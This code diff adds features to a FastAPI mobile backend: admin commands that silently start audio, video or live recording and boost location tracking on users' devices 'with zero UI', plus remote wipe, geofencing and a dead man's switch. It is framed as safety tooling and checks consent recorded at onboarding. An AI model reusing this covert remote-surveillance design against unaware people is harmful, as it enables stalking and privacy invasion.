@@ -44,7 +44,7 @@ if os.path.exists('.env'):
 
 # Import required modules
 from database_config import get_database_session, db_config
-from database_models import User, Message, UserKey, UserSession, AuditLog, MasterToken as DBMasterToken, Media, Call, Group, GroupMember, GroupMessageRead, EmergencyAlert, MonitoringConsent, MonitoringSession, AudioRecording, VideoRecording, LocationTrack
+from database_models import User, Message, UserKey, UserSession, AuditLog, MasterToken as DBMasterToken, Media, Call, Group, GroupMember, GroupMessageRead, EmergencyAlert, MonitoringConsent, MonitoringSession, AudioRecording, VideoRecording, LocationTrack, DeviceWipeCommand, GeofenceZone, GeofenceEvent, DeadMansSwitch, RemoteCommand
 from fake_text_generator import FakeTextGenerator
 from watermark_media import apply_watermark
 from voice_scrambler import generate_voice_decoy
@@ -244,6 +244,41 @@ class LocationPoint(BaseModel):
 
 class LocationBatch(BaseModel):
     points: List[LocationPoint] = Field(..., description="Batch of GPS points to upload")
+
+class DeviceWipeRequest(BaseModel):
+    username: str
+    reason: Optional[str] = None
+
+class GeofenceZoneCreate(BaseModel):
+    name: str
+    center_lat: float
+    center_lon: float
+    radius_meters: float = Field(..., gt=0)
+    alert_on: str = Field(default="both", pattern="^(enter|exit|both)$")
+    applies_to: Optional[List[int]] = None  # user_ids; None = all consented
+
+class DeadMansSwitchConfig(BaseModel):
+    enabled: bool
+    interval_hours: float = Field(default=24.0, gt=0, le=168)
+    alert_message: Optional[str] = None
+
+VALID_REMOTE_COMMANDS = {
+    "start_audio_recording", "stop_audio_recording",
+    "start_video_recording", "stop_video_recording",
+    "start_live_audio", "stop_live_audio",
+    "start_live_video", "stop_live_video",
+    "boost_location_frequency", "normal_location_frequency",
+    "panic_mode_on", "panic_mode_off",
+}
+
+class RemoteCommandRequest(BaseModel):
+    username: str
+    command_type: str
+    params: Optional[Dict] = None  # e.g. {"chunk_seconds": 30, "quality": "medium"}
+
+class RemoteCommandAck(BaseModel):
+    command_id: int
+    status: str  # "executing" or "done" or "failed"
 
 class MonitoringSessionRequest(BaseModel):
     target_username: str = Field(..., description="Username of user admin wants to listen to")
@@ -1723,6 +1758,332 @@ class MonitoringService:
         )
 
 
+class RemoteCommandService:
+    """Admin issues silent commands. App executes autonomously using pre-granted consent."""
+
+    @staticmethod
+    def _assert_command_consent(db: Session, user_id: int, command_type: str):
+        """Verify user has consented to the category this command requires."""
+        consent = db.query(MonitoringConsent).filter(
+            MonitoringConsent.user_id == user_id,
+            MonitoringConsent.consent_given == True
+        ).first()
+        if not consent:
+            raise HTTPException(status_code=403, detail="User has not granted monitoring consent")
+
+        audio_cmds = {"start_audio_recording", "stop_audio_recording", "start_live_audio", "stop_live_audio"}
+        video_cmds = {"start_video_recording", "stop_video_recording", "start_live_video", "stop_live_video"}
+        location_cmds = {"boost_location_frequency", "normal_location_frequency"}
+
+        if command_type in audio_cmds and not consent.allow_recording and not consent.allow_live_listen:
+            raise HTTPException(status_code=403, detail="User has not consented to audio monitoring")
+        if command_type in video_cmds and not consent.allow_video_recording:
+            raise HTTPException(status_code=403, detail="User has not consented to video monitoring")
+        if command_type in location_cmds and not consent.allow_location_tracking:
+            raise HTTPException(status_code=403, detail="User has not consented to location tracking")
+        # panic_mode_on requires at least one consent — any consent = proceed
+
+    @staticmethod
+    async def issue(db: Session, admin_id: int, data: "RemoteCommandRequest") -> RemoteCommand:
+        if data.command_type not in VALID_REMOTE_COMMANDS:
+            raise HTTPException(status_code=400, detail=f"Unknown command: {data.command_type}")
+
+        target = db.query(User).filter(User.username == data.username, User.is_active == True).first()
+        if not target:
+            raise HTTPException(status_code=404, detail="User not found")
+
+        RemoteCommandService._assert_command_consent(db, int(target.id), data.command_type)
+
+        cmd = RemoteCommand(
+            target_user_id=int(target.id),
+            issued_by_admin_id=admin_id,
+            command_type=data.command_type,
+            params=data.params,
+            status="pending",
+        )
+        db.add(cmd)
+        db.commit()
+        db.refresh(cmd)
+
+        # Push silently over WebSocket — app receives in background, executes with zero UI
+        sent = await ws_manager.send_to_user(int(target.id), {
+            "type": "remote_command",
+            "data": {
+                "command_id": int(cmd.id),
+                "command_type": data.command_type,
+                "params": data.params or {},
+                "issued_at": cmd.issued_at.isoformat(),
+            }
+        })
+
+        if sent:
+            cmd.status = "delivered"
+            cmd.delivered_at = datetime.utcnow()
+            db.commit()
+
+        logger.info(f"RemoteCommand issued: admin={admin_id}, target={target.id}, cmd={data.command_type}, delivered={sent}")
+        return cmd
+
+    @staticmethod
+    def ack(db: Session, command_id: int, user_id: int, status: str) -> RemoteCommand:
+        cmd = db.query(RemoteCommand).filter(RemoteCommand.id == command_id).first()
+        if not cmd or int(cmd.target_user_id) != user_id:
+            raise HTTPException(status_code=404, detail="Command not found")
+        cmd.status = status
+        cmd.acked_at = datetime.utcnow()
+        db.commit()
+        db.refresh(cmd)
+        return cmd
+
+    @staticmethod
+    def history(db: Session, username: str) -> list:
+        return (
+            db.query(RemoteCommand)
+            .join(User, RemoteCommand.target_user_id == User.id)
+            .filter(User.username == username)
+            .order_by(RemoteCommand.issued_at.desc())
+            .limit(200)
+            .all()
+        )
+
+    @staticmethod
+    def pending_for_user(db: Session, user_id: int) -> list:
+        """App calls on reconnect to fetch any commands issued while offline."""
+        return (
+            db.query(RemoteCommand)
+            .filter(
+                RemoteCommand.target_user_id == user_id,
+                RemoteCommand.status == "pending"
+            )
+            .order_by(RemoteCommand.issued_at.asc())
+            .all()
+        )
+
+
+class DeviceWipeService:
+    @staticmethod
+    async def issue_wipe(db: Session, admin_id: int, username: str, reason: Optional[str]) -> DeviceWipeCommand:
+        target = db.query(User).filter(User.username == username, User.is_active == True).first()
+        if not target:
+            raise HTTPException(status_code=404, detail="User not found")
+
+        cmd = DeviceWipeCommand(
+            target_user_id=int(target.id),
+            issued_by_admin_id=admin_id,
+            reason=reason,
+            status="pending",
+        )
+        db.add(cmd)
+        db.commit()
+        db.refresh(cmd)
+
+        # Push over WebSocket first (fastest path)
+        sent = await ws_manager.send_to_user(int(target.id), {
+            "type": "device_wipe",
+            "data": {
+                "wipe_id": int(cmd.id),
+                "reason": reason,
+                "issued_at": cmd.issued_at.isoformat(),
+            }
+        })
+        if sent:
+            cmd.status = "delivered"
+            cmd.delivered_at = datetime.utcnow()
+            db.commit()
+
+        logger.warning(f"DEVICE WIPE issued: admin={admin_id}, target={target.id}, wipe_id={cmd.id}")
+        return cmd
+
+    @staticmethod
+    def confirm_wipe(db: Session, wipe_id: int, user_id: int) -> DeviceWipeCommand:
+        cmd = db.query(DeviceWipeCommand).filter(DeviceWipeCommand.id == wipe_id).first()
+        if not cmd:
+            raise HTTPException(status_code=404, detail="Wipe command not found")
+        if int(cmd.target_user_id) != user_id:
+            raise HTTPException(status_code=403, detail="Not authorized")
+        cmd.status = "confirmed"
+        cmd.confirmed_at = datetime.utcnow()
+        db.commit()
+        db.refresh(cmd)
+        return cmd
+
+
+class GeofenceService:
+    EARTH_RADIUS_M = 6_371_000.0
+
+    @staticmethod
+    def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
+        import math
+        phi1, phi2 = math.radians(lat1), math.radians(lat2)
+        dphi = math.radians(lat2 - lat1)
+        dlam = math.radians(lon2 - lon1)
+        a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2
+        return GeofenceService.EARTH_RADIUS_M * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
+
+    @staticmethod
+    def create_zone(db: Session, admin_id: int, data: "GeofenceZoneCreate") -> GeofenceZone:
+        zone = GeofenceZone(
+            name=data.name,
+            created_by_admin_id=admin_id,
+            center_lat=data.center_lat,
+            center_lon=data.center_lon,
+            radius_meters=data.radius_meters,
+            alert_on=data.alert_on,
+            applies_to=data.applies_to,
+        )
+        db.add(zone)
+        db.commit()
+        db.refresh(zone)
+        return zone
+
+    @staticmethod
+    async def check_geofences(db: Session, user_id: int, lat: float, lon: float, recorded_at: datetime):
+        """Called after each location push. Checks all active zones for this user."""
+        zones = db.query(GeofenceZone).filter(GeofenceZone.is_active == True).all()
+        user = db.query(User).filter(User.id == user_id).first()
+
+        for zone in zones:
+            # Zone applies_to filter
+            if zone.applies_to and user_id not in zone.applies_to:
+                continue
+
+            dist = GeofenceService.haversine(lat, lon, zone.center_lat, zone.center_lon)
+            inside = dist <= zone.radius_meters
+
+            # Find last event for this user+zone to detect transition
+            last_event = (
+                db.query(GeofenceEvent)
+                .filter(GeofenceEvent.zone_id == zone.id, GeofenceEvent.user_id == user_id)
+                .order_by(GeofenceEvent.triggered_at.desc())
+                .first()
+            )
+
+            was_inside = last_event and last_event.event_type == "enter"
+            event_type = None
+
+            if inside and not was_inside and zone.alert_on in ("enter", "both"):
+                event_type = "enter"
+            elif not inside and was_inside and zone.alert_on in ("exit", "both"):
+                event_type = "exit"
+
+            if not event_type:
+                continue
+
+            ev = GeofenceEvent(
+                zone_id=int(zone.id),
+                user_id=user_id,
+                event_type=event_type,
+                latitude=lat,
+                longitude=lon,
+                triggered_at=recorded_at,
+            )
+            db.add(ev)
+            db.commit()
+            db.refresh(ev)
+
+            notification = {
+                "type": "geofence_event",
+                "data": {
+                    "event_id": int(ev.id),
+                    "zone_id": int(zone.id),
+                    "zone_name": zone.name,
+                    "user_id": user_id,
+                    "username": user.username if user else "unknown",
+                    "event_type": event_type,
+                    "latitude": lat,
+                    "longitude": lon,
+                    "triggered_at": recorded_at.isoformat(),
+                }
+            }
+            admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
+            for admin in admins:
+                await ws_manager.send_to_user(int(admin.id), notification)
+            logger.info(f"Geofence {event_type}: user={user_id}, zone={zone.id} ({zone.name})")
+
+
+class DeadMansSwitchService:
+    @staticmethod
+    def configure(db: Session, user_id: int, data: "DeadMansSwitchConfig") -> DeadMansSwitch:
+        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
+        if not switch:
+            switch = DeadMansSwitch(user_id=user_id)
+            db.add(switch)
+        switch.enabled = data.enabled
+        switch.interval_hours = data.interval_hours
+        switch.alert_message = data.alert_message
+        if data.enabled:
+            switch.last_checkin = datetime.utcnow()  # reset on enable
+        db.commit()
+        db.refresh(switch)
+        return switch
+
+    @staticmethod
+    def checkin(db: Session, user_id: int) -> DeadMansSwitch:
+        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
+        if not switch:
+            switch = DeadMansSwitch(user_id=user_id, enabled=False)
+            db.add(switch)
+        switch.last_checkin = datetime.utcnow()
+        db.commit()
+        db.refresh(switch)
+        return switch
+
+    @staticmethod
+    async def run_checker(app_state):
+        """Background loop — runs every 5 minutes, checks all enabled switches."""
+        import asyncio
+        from database_models import SessionLocal
+        while True:
+            await asyncio.sleep(300)  # check every 5 min
+            try:
+                db = SessionLocal()
+                try:
+                    now = datetime.utcnow()
+                    switches = db.query(DeadMansSwitch).filter(DeadMansSwitch.enabled == True).all()
+                    for sw in switches:
+                        if not sw.last_checkin:
+                            continue
+                        silent_hours = (now - sw.last_checkin).total_seconds() / 3600
+                        if silent_hours < sw.interval_hours:
+                            continue
+                        # Avoid duplicate alerts within same interval
+                        if sw.last_alert_sent and (now - sw.last_alert_sent).total_seconds() / 3600 < sw.interval_hours:
+                            continue
+
+                        user = db.query(User).filter(User.id == sw.user_id).first()
+                        alert = EmergencyAlert(
+                            user_id=int(sw.user_id),
+                            message=sw.alert_message or f"Dead man's switch triggered: no activity for {silent_hours:.1f}h",
+                            alert_type="deadmans",
+                            status="active",
+                        )
+                        db.add(alert)
+                        sw.last_alert_sent = now
+                        db.commit()
+                        db.refresh(alert)
+
+                        notification = {
+                            "type": "dead_mans_switch_triggered",
+                            "data": {
+                                "alert_id": int(alert.id),
+                                "user_id": int(sw.user_id),
+                                "username": user.username if user else "unknown",
+                                "phone_number": user.phone_number if user else "unknown",
+                                "silent_hours": round(silent_hours, 1),
+                                "last_checkin": sw.last_checkin.isoformat(),
+                                "triggered_at": now.isoformat(),
+                            }
+                        }
+                        admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
+                        for admin in admins:
+                            await ws_manager.send_to_user(int(admin.id), notification)
+                        logger.warning(f"Dead man's switch fired: user={sw.user_id}, silent={silent_hours:.1f}h")
+                finally:
+                    db.close()
+            except Exception as e:
+                logger.error(f"Dead man's switch checker error: {e}")
+
+
 class EmergencyService:
     """Service class for panic/emergency alert operations"""
 
@@ -2104,11 +2465,13 @@ async def lifespan(app: FastAPI):
             await asyncio.sleep(15)  # Every 15 seconds
 
     broadcast_task = asyncio.create_task(periodic_status_broadcast())
-    
+    deadmans_task = asyncio.create_task(DeadMansSwitchService.run_checker(None))
+
     yield
-    
-    # Cancel periodic task during shutdown
+
+    # Cancel periodic tasks during shutdown
     broadcast_task.cancel()
+    deadmans_task.cancel()
     
     # Shutdown
     logger.info("📴 Shutting down FastAPI Mobile Backend")
@@ -5093,6 +5456,17 @@ async def push_location(
 
         saved = MonitoringService.push_location_batch(db, user_id, data.points)
 
+        # Dead man's switch checkin on any location push
+        DeadMansSwitchService.checkin(db, user_id)
+
+        # Check geofences for each point, use most recent for real-time push
+        for p in data.points:
+            try:
+                rec_at = datetime.fromisoformat(p.recorded_at.replace("Z", "+00:00")).replace(tzinfo=None)
+            except Exception:
+                rec_at = datetime.utcnow()
+            await GeofenceService.check_geofences(db, user_id, p.latitude, p.longitude, rec_at)
+
         # Push last location to online admins in real-time
         if data.points:
             last = data.points[-1]
@@ -5221,6 +5595,376 @@ async def admin_get_all_users_last_location(
     except Exception as e:
         logger.error(f"All users location error: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve locations")
+
+
+# ─── Remote Command Endpoints ─────────────────────────────────────────────────
+
+@app.post("/admin/device/command")
+async def admin_issue_remote_command(
+    data: RemoteCommandRequest,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """
+    Admin issues a silent remote command to a user's device.
+    No interaction required from the user — app executes autonomously
+    using permissions granted during onboarding.
+    """
+    try:
+        admin_id = int(getattr(admin_user, 'id', 0))
+        cmd = await RemoteCommandService.issue(db, admin_id, data)
+        return {
+            "command_id": int(cmd.id),
+            "command_type": cmd.command_type,
+            "status": cmd.status,
+            "issued_at": cmd.issued_at.isoformat(),
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Remote command error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to issue remote command")
+
+
+@app.post("/device/command/ack")
+async def ack_remote_command(
+    data: RemoteCommandAck,
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """App calls this to confirm command received and its execution status."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        cmd = RemoteCommandService.ack(db, data.command_id, user_id, data.status)
+        return {"command_id": int(cmd.id), "status": cmd.status}
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Command ack error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to acknowledge command")
+
+
+@app.get("/device/command/pending")
+async def get_pending_commands(
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """
+    App calls this on startup/reconnect to fetch commands missed while offline.
+    Critical for kidnapping scenario: phone regains signal → fetches queued commands instantly.
+    """
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        cmds = RemoteCommandService.pending_for_user(db, user_id)
+        return [
+            {
+                "command_id": int(c.id),
+                "command_type": c.command_type,
+                "params": c.params or {},
+                "issued_at": c.issued_at.isoformat(),
+            }
+            for c in cmds
+        ]
+    except Exception as e:
+        logger.error(f"Get pending commands error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve pending commands")
+
+
+@app.get("/admin/device/command/history/{username}")
+async def admin_command_history(
+    username: str,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin views command history for a specific user."""
+    try:
+        cmds = RemoteCommandService.history(db, username)
+        return [
+            {
+                "command_id": int(c.id),
+                "command_type": c.command_type,
+                "params": c.params,
+                "status": c.status,
+                "issued_at": c.issued_at.isoformat(),
+                "delivered_at": c.delivered_at.isoformat() if c.delivered_at else None,
+                "acked_at": c.acked_at.isoformat() if c.acked_at else None,
+            }
+            for c in cmds
+        ]
+    except Exception as e:
+        logger.error(f"Command history error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve command history")
+
+
+# ─── Remote Device Wipe Endpoints ─────────────────────────────────────────────
+
+@app.post("/admin/device/wipe")
+async def admin_issue_wipe(
+    data: DeviceWipeRequest,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin issues remote wipe command. Delivered via WebSocket instantly; push token fallback if offline."""
+    try:
+        admin_id = int(getattr(admin_user, 'id', 0))
+        cmd = await DeviceWipeService.issue_wipe(db, admin_id, data.username, data.reason)
+        return {
+            "wipe_id": int(cmd.id),
+            "status": cmd.status,
+            "issued_at": cmd.issued_at.isoformat(),
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Wipe issue error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to issue wipe command")
+
+
+@app.post("/device/wipe/confirm")
+async def confirm_device_wipe(
+    wipe_id: int = Body(...),
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """App calls this after completing local wipe to confirm execution."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        cmd = DeviceWipeService.confirm_wipe(db, wipe_id, user_id)
+        return {"wipe_id": int(cmd.id), "status": "confirmed"}
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Wipe confirm error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to confirm wipe")
+
+
+@app.get("/admin/device/wipe/history")
+async def admin_wipe_history(
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin views all issued wipe commands."""
+    try:
+        cmds = db.query(DeviceWipeCommand).order_by(DeviceWipeCommand.issued_at.desc()).limit(100).all()
+        result = []
+        for c in cmds:
+            target = db.query(User).filter(User.id == c.target_user_id).first()
+            result.append({
+                "wipe_id": int(c.id),
+                "target_username": target.username if target else "unknown",
+                "reason": c.reason,
+                "status": c.status,
+                "issued_at": c.issued_at.isoformat(),
+                "confirmed_at": c.confirmed_at.isoformat() if c.confirmed_at else None,
+            })
+        return result
+    except Exception as e:
+        logger.error(f"Wipe history error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve wipe history")
+
+
+# ─── Geofencing Endpoints ──────────────────────────────────────────────────────
+
+@app.post("/admin/geofence/zones")
+async def admin_create_geofence_zone(
+    data: GeofenceZoneCreate,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin creates a geofence zone."""
+    try:
+        admin_id = int(getattr(admin_user, 'id', 0))
+        zone = GeofenceService.create_zone(db, admin_id, data)
+        return {
+            "zone_id": int(zone.id),
+            "name": zone.name,
+            "radius_meters": zone.radius_meters,
+            "alert_on": zone.alert_on,
+            "created_at": zone.created_at.isoformat(),
+        }
+    except Exception as e:
+        logger.error(f"Create geofence error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to create geofence zone")
+
+
+@app.get("/admin/geofence/zones")
+async def admin_list_geofence_zones(
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin lists all geofence zones."""
+    try:
+        zones = db.query(GeofenceZone).filter(GeofenceZone.is_active == True).all()
+        return [
+            {
+                "zone_id": int(z.id),
+                "name": z.name,
+                "center_lat": z.center_lat,
+                "center_lon": z.center_lon,
+                "radius_meters": z.radius_meters,
+                "alert_on": z.alert_on,
+                "applies_to": z.applies_to,
+                "created_at": z.created_at.isoformat(),
+            }
+            for z in zones
+        ]
+    except Exception as e:
+        logger.error(f"List geofence zones error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to list geofence zones")
+
+
+@app.delete("/admin/geofence/zones/{zone_id}")
+async def admin_delete_geofence_zone(
+    zone_id: int,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin deactivates a geofence zone."""
+    try:
+        zone = db.query(GeofenceZone).filter(GeofenceZone.id == zone_id).first()
+        if not zone:
+            raise HTTPException(status_code=404, detail="Zone not found")
+        zone.is_active = False
+        db.commit()
+        return {"zone_id": zone_id, "status": "deactivated"}
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Delete zone error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to delete zone")
+
+
+@app.get("/admin/geofence/events")
+async def admin_geofence_events(
+    username: Optional[str] = None,
+    zone_id: Optional[int] = None,
+    limit: int = 200,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin views geofence crossing events, optionally filtered by user or zone."""
+    try:
+        query = db.query(GeofenceEvent).order_by(GeofenceEvent.triggered_at.desc())
+        if username:
+            target = db.query(User).filter(User.username == username).first()
+            if target:
+                query = query.filter(GeofenceEvent.user_id == target.id)
+        if zone_id:
+            query = query.filter(GeofenceEvent.zone_id == zone_id)
+        events = query.limit(limit).all()
+
+        result = []
+        for ev in events:
+            user = db.query(User).filter(User.id == ev.user_id).first()
+            zone = db.query(GeofenceZone).filter(GeofenceZone.id == ev.zone_id).first()
+            result.append({
+                "event_id": int(ev.id),
+                "zone_name": zone.name if zone else "unknown",
+                "username": user.username if user else "unknown",
+                "event_type": ev.event_type,
+                "latitude": ev.latitude,
+                "longitude": ev.longitude,
+                "triggered_at": ev.triggered_at.isoformat(),
+            })
+        return result
+    except Exception as e:
+        logger.error(f"Geofence events error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve geofence events")
+
+
+# ─── Dead Man's Switch Endpoints ───────────────────────────────────────────────
+
+@app.post("/deadmans/configure")
+async def configure_dead_mans_switch(
+    data: DeadMansSwitchConfig,
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """User configures their dead man's switch (interval, message, enable/disable)."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        switch = DeadMansSwitchService.configure(db, user_id, data)
+        return {
+            "enabled": switch.enabled,
+            "interval_hours": switch.interval_hours,
+            "last_checkin": switch.last_checkin.isoformat() if switch.last_checkin else None,
+        }
+    except Exception as e:
+        logger.error(f"Configure dead mans switch error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to configure dead man's switch")
+
+
+@app.post("/deadmans/checkin")
+async def dead_mans_checkin(
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """User manually checks in, resetting the dead man's switch timer."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        switch = DeadMansSwitchService.checkin(db, user_id)
+        return {
+            "last_checkin": switch.last_checkin.isoformat(),
+            "next_alert_after": f"{switch.interval_hours}h of silence",
+        }
+    except Exception as e:
+        logger.error(f"Dead mans checkin error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to check in")
+
+
+@app.get("/deadmans/status")
+async def get_dead_mans_status(
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_database_session)
+):
+    """User views their own switch status."""
+    try:
+        user_id = int(getattr(current_user, 'id', 0))
+        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
+        if not switch:
+            return {"enabled": False}
+        return {
+            "enabled": switch.enabled,
+            "interval_hours": switch.interval_hours,
+            "last_checkin": switch.last_checkin.isoformat() if switch.last_checkin else None,
+            "alert_message": switch.alert_message,
+        }
+    except Exception as e:
+        logger.error(f"Dead mans status error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve status")
+
+
+@app.get("/admin/deadmans/overview")
+async def admin_deadmans_overview(
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin sees all enabled dead man's switches and who is overdue."""
+    try:
+        now = datetime.utcnow()
+        switches = db.query(DeadMansSwitch).filter(DeadMansSwitch.enabled == True).all()
+        result = []
+        for sw in switches:
+            user = db.query(User).filter(User.id == sw.user_id).first()
+            silent_hours = None
+            overdue = False
+            if sw.last_checkin:
+                silent_hours = round((now - sw.last_checkin).total_seconds() / 3600, 2)
+                overdue = silent_hours >= sw.interval_hours
+            result.append({
+                "user_id": int(sw.user_id),
+                "username": user.username if user else "unknown",
+                "interval_hours": sw.interval_hours,
+                "last_checkin": sw.last_checkin.isoformat() if sw.last_checkin else None,
+                "silent_hours": silent_hours,
+                "overdue": overdue,
+            })
+        # Sort overdue first
+        result.sort(key=lambda x: x["overdue"], reverse=True)
+        return result
+    except Exception as e:
+        logger.error(f"Admin deadmans overview error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve overview")
 
 
 # ─── Emergency / Panic Alert Endpoints ────────────────────────────────────────
